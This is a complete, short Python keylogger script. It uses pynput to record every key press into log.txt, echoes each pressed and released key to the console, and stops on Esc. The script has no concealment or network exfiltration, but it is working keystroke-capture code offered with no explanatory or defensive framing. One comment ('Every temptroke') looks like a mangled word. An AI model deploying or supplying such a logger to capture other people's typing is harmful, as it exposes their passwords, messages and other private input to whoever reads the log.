import pynput
from pynput.keyboard import Key, Listener

temp = [] 

def on_press(key):
    temp.append(key)
    write_file(temp)

    try:
        print("Alphanumeric key {0} pressed".format(key.char))
    except AttributeError:
        print("Special key {0} pressed".format(key))

def write_file(temp):
    with open("log.txt", "w") as f:
        for key in temp:
            k = str(key).replace("'", "")
            f.write(k)

            # Every temptroke for readability
            f.write("  ")

def on_release(key):
    print('{0} released'.format(key))
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
